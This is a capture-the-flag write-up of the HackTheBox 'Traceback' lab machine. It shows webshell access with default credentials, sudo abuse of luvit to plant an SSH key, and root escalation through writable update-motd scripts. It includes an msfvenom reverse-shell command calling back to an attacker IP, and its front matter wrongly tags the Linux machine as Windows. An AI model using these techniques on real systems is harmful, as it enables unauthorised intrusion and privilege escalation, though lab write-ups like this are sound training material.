---
title: Write-up Traceback Machine
author: ScarNGone & pcw3r
date: 2020-08-15 15:00:00 +0000
categories: [HackTheBox, Boot2Root]
tags: [WINDOWS, EASY, ENUMERATION, SCRIPTING, SUDO EXPLOITATION, PERMISSION EXPLOITATION, PAYLOAD]
---

**<center>RefÂ°: HTB-13-Boot2Root</center>**

![Desktop View]({{ "/assets/img/traceback/HTB-Badge-Traceback.png" | relative_url }})

--- Traceback is a Linux machine that highlights the exploitation of backdoor (from webshell smevk) present behind a website to gained a foothold. This give us a possibility to enum and find a way to execute lateral movement on user sysadmin through lua script and misconfiguration sudo.

Scripts in /etc/update-motd.d/* running under root privileges can be write-edited by the user "sysadmin". This gives the possibility to place  payload and grab a "reverse shell" with root privileges.

![Desktop View]({{ "/assets/img/traceback/HTB-Information-Traceback.png" | relative_url }})

## **<span style='color:#c0392b'>[1] Discovery - Figure out environment</span>**
### Network Service Scanning
***
The nmap scan reveals `SSH` and `Apache` to be running on their usual ports; 22 and 80.

```terminal
$ nmap -A -T5 10.10.10.181 -p-
```

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-nmap.png" | relative_url }})

### Website defaced
***
We discover deface site on web service. Apparently `Xh4H hacker` left a `backdoor`, maybe to exploit it later.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-web.png" | relative_url }})

The hacker left us a hint in the source code by adding as a comment in the html code this : `Some of the best web shells that you might need ;)`.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-source.png" | relative_url }})

This hint is a reference of the following webshells from github repository : <https://github.com/TheBinitGhimire/Web-Shells>

A `webshell` is a web security threat, which is a web-based implementation of the shell concept. 
A webshell is able to be uploaded to a web server to allow remote access to the web server, such as the web server's file system. 
A webshell is unique in that it enables users to access a web server by way of a web browser that acts like a command-line interface.

## **<span style='color:#c0392b'>[2] Foothold - Get into the target </span>**
### Finding SmEvK Webshell
***
After testing them all, we find the webshell concerned : `SmEvK_PaThAn Shell V3` on http://10.10.10.181/smevk.php

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-webshell.png" | relative_url }})

We success to log-in the webshell with credential mentionned in the source code : `admin / admin`

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-githubwebshell.png" | relative_url }})

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-webshell2.png" | relative_url }})

The exploitation is successful and we have gained a foothold.

## **<span style='color:#c0392b'>Lateral Movement - Move through environment</span>**
### Sudo Misconfiguration
***
Enum with webadmin account and check the file /etc/passwd to find an other interesting system user : sysadmin

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-passwd.png" | relative_url }})

User sysadmin may run the following commands with no password under root privilege `(ALL) NOPASSWD: /home/sysadmin/luvit`

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-misconfigurationsudo.png" | relative_url }})

We find file under `/home/webadmin/note.txt` which refers to a tool to practice lua.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-notes.png" | relative_url }})

`Lua` is a lightweight, high-level, multi-paradigm programming language designed primarily for embedded use in applications.

The tool to practice lua script is `Luvit`. He is mentionned above on the result of the command sudo -l.

### SSH Authorized Keys
***
With present misconfiguration on sudo command for the sysadmin user, we use personnal lua script to send my public ssh key in her folder `*/.ssh/authorized_keys`. Same method in other machine : See Postman Writeup.

Reference - lua script : <https://www.tutorialspoint.com/lua/lua_file_io.htm>

After search in the documentation, we can define the script pattern to be used :

```shell
CODEfile = io.open (filename [, mode])
file:write("--test")
file:close()
.....
filename = "/home/sysadmin/.ssh/authorized_keys"
mode = "a" Append mode that opens an existing file or creates a new file for appending.
--test = "pub ssh key value"
```

We generate our ssh key pair to put the public key value in our lua script.

```terminal
$ ssh-keygen -t rsa -b 2048
```

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-scriptlua.png" | relative_url }})

We upload the script from the webshell and execute this under root privilege.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-upload.png" | relative_url }})

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-runscript.png" | relative_url }})

### Remote Service SSH login
***
We have now the possibility to connect on sysadmin through ssh :

```terminal
$ ssh sysadmin@10.10.10.181 -i traceback
```

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-sysadminssh.png" | relative_url }})

### Flag user
***
We flag the user to validate the compromission of the system user.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-userflag.png" | relative_url }})


## **<span style='color:#c0392b'>[3] Privilege Escalation - Gain higher-level permissions</span>**
### Privilege Misconfiguration
***
We use linpeas script to check every possible path to increase our privilege.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-sendlinpeas.png" | relative_url }})

The script reveal interesting group named `/etc/update-motd.d` where many files are writables with sysadmin privilege.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-groupwfiles.png" | relative_url }})

We can confirm that with `ls -la` command.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-verifwfile.png" | relative_url }})

According to linux manual :

"UNIX/Linux system adminstrators often communicate important information to console and remote users by maintaining text in the file /etc/motd, which is displayed by the pam_motd(8) module on interactive shell logins. Traditionally, this file is static text, typically installed by the distribution and only updated on release upgrades, or overwritten by the local administrator with pertinent information.

Ubuntu introduced the update-motd framework, by which the motd(5) is dynamically assembled from a collection of scripts at login.

Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at each login, and this information is concatenated in /var/run/motd. The order of script execution is determined by the run-parts(8) --lsbsysinit option (basically alphabetical order, with a few caveats)."

Reference - Manual Linux Update-motd.d : <http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html>

Here you can see how this works when you log on to ssh :

For this example /etc/update-motd.d/`00-header` file = `Welcome to Xh4H land`

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-headerssh.png" | relative_url }})

The use of the `pspy tool` confirms the execution of these scripts under root privilege `(UID 0)`.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-checkprocess.png" | relative_url }})

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-sshview.png" | relative_url }})


### Obtaining Reverse Shell with Payload Injection
***
We can push custom payload into one of theses script to get reverse shell under root privilege when they are executed.

```terminal
$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=10.10.14.54 LPORT=4444
```

After creating our payload, we send it to our target machine and place it in the /tmp/ folder.

Now we can call our payload to be executed in one of the scripts in the update-motd.d folder. I choose 00-header.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-insertpayload.png" | relative_url }})

We prepare our attacking machine to receive the shell with nc command and we launch new ssh connexion.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-viewexploit.png" | relative_url }})


### Flag root
***
We obtained the shell under root privilege. We have compromise Traceback machine.

![Desktop View]({{ "/assets/img/traceback/HTB-Images-Traceback-rootflag.png" | relative_url }})


***

## **<center>Trophy</center>**

> **Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.**
>
> Chanda Kochhar
